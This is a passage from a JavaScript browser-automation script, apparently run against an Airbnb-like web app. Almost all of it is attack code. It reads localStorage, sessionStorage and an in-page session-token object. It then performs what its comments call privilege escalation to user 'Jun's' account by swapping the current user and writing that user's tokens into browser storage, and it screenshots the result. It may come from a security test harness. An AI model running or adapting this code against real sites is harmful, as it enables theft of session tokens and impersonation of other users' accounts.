      }

      // Attempt to access window.airbnbData.sessionTokens
      const airbnbSessionTokens = window.airbnbData?.sessionTokens || null;

      return {
        localStorage: localStorageData,
        sessionStorage: sessionStorageData,
        airbnbSessionTokens
      };
    });

    // Attempt privilege escalation to Jun's account
    await page.evaluate(() => {
      // Find Jun's user data
      const junUser = window.airbnbData.users.find(user => user.id === 'jun');

      if (junUser) {
        // Override current user session
        window.airbnbData.currentUser = junUser;

        // Update localStorage with Jun's tokens if available
        if (window.airbnbData.sessionTokens) {
          localStorage.setItem('sessionTokens', JSON.stringify(window.airbnbData.sessionTokens));
          sessionStorage.setItem('currentUser', JSON.stringify(junUser));
        }
      }
    });

    // Take screenshot after privilege escalation attempt
    await page.screenshot({ path: path.join(screenshotsDir, 'step_2_privilege_escalation.png') });
